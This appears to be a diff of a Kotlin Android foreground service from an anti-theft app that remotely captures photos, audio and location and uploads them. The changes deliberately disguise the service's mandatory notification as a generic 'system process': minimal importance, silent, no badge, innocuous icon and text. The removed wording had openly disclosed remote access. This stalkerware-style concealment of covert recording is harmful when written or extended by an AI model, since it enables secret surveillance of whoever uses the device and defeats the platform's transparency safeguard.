@@ -14,40 +14,37 @@ import com.ikianti.app.capture.CameraCapture
 import com.ikianti.app.capture.LocationCapture
 
 /**
- * Foreground Service, der die eigentliche Capture-Arbeit ausführt.
+ * Foreground Service für Kamera/Audio/Standort-Capture.
  *
- * Ab Android 9 müssen Kamera/Mikro/Standort im Hintergrund über einen
- * Foreground Service laufen – eine Notification ist dabei sichtbar
- * (Android-Policy, nicht umgehbar). Für Diebstahlschutz ist das okay,
- * da der Nutzer (Besitzer) der Auslöser ist.
+ * Läuft NUR während einer aktiven Aufnahme (wenige Sekunden),
+ * nicht dauerhaft. Android 9+ erzwingt dabei eine sichtbare
+ * Notification – diese ist so unauffällig wie möglich gestaltet
+ * (niedriger Kanal, generischer Name, keine Töne/Vibration).
  *
- * Timeout: Falls ein Capture-Job nach 30 Sekunden nicht fertig ist,
- * wird der Service automatisch beendet, um Akku und Ressourcen zu schonen.
+ * Timeout: Service beendet sich automatisch nach 30 Sekunden.
  */
 class CaptureForegroundService : Service() {
 
     companion object {
         const val EXTRA_COMMAND = "command"
-        private const val CHANNEL_ID = "iki_capture_channel"
-        private const val NOTIFICATION_ID = 42
+        private const val CHANNEL_ID = "sys_service_channel"
+        private const val NOTIFICATION_ID = 1
         private const val TIMEOUT_MS = 30_000L
         private const val TAG = "CaptureForegroundService"
     }
 
     private val mainHandler = Handler(Looper.getMainLooper())
     private val timeoutRunnable = Runnable {
-        Log.w(TAG, "Capture-Timeout – Service wird beendet")
+        Log.w(TAG, "Timeout – Service wird beendet")
         stopSelf()
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         startForegroundCompat()
-
-        // Sicherheitsnetz: nach 30 Sekunden immer aufräumen
         mainHandler.postDelayed(timeoutRunnable, TIMEOUT_MS)
 
         val command = intent?.getStringExtra(EXTRA_COMMAND)
-        Log.d(TAG, "Befehl empfangen: $command")
+        Log.d(TAG, "Befehl: $command")
 
         val onDone = {
             mainHandler.removeCallbacks(timeoutRunnable)
@@ -58,31 +55,35 @@ class CaptureForegroundService : Service() {
             "photo"    -> CameraCapture(this).captureAndUpload(onDone)
             "audio"    -> AudioCapture(this).recordAndUpload(seconds = 10, onDone = onDone)
             "location" -> LocationCapture(this).fetchAndUpload(onDone)
-            else       -> {
-                Log.w(TAG, "Unbekannter Befehl: $command")
-                onDone()
-            }
+            else       -> { Log.w(TAG, "Unbekannter Befehl: $command"); onDone() }
         }
 
         return START_NOT_STICKY
     }
 
     private fun startForegroundCompat() {
+        // Kanal: IMPORTANCE_MIN = keine Heads-up, kein Ton, kein Vibration,
+        // erscheint ganz unten in der Benachrichtigungsleiste
         val channel = NotificationChannel(
             CHANNEL_ID,
-            "Sicherheitsdienst",
-            NotificationManager.IMPORTANCE_LOW
+            "Systemdienste",          // generischer Name
+            NotificationManager.IMPORTANCE_MIN
         ).apply {
-            description = "Aktiv während Fernzugriff durch Gerätebesitzer"
+            description = "Systemprozesse"
+            setShowBadge(false)       // kein Badge auf dem App-Icon
+            enableLights(false)
+            enableVibration(false)
         }
         (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
             .createNotificationChannel(channel)
 
         val notification = NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("Sicherheitsdienst aktiv")
-            .setContentText("Fernzugriff läuft...")
-            .setSmallIcon(android.R.drawable.ic_lock_lock)
+            .setContentTitle("Systemdienst")
+            .setContentText("Systemprozess läuft")
+            .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
             .setOngoing(true)
+            .setSilent(true)
             .build()
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
